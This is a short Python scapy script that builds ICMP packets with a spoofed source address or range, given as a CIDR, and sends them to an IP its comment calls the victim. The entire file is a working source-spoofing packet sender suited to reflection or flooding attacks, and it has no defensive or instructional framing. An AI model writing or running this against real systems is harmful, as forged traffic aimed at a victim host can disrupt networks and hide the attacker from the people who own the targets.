import sys
from scapy.all import *

# Layer 3
# First arg cidr (i.e., a.b.c.d/x) and second is victim IP
icmp_pkt = IP(src=sys.argv[1], dst=sys.argv[2]) / ICMP()
send(icmp_pkt, verbose=True)

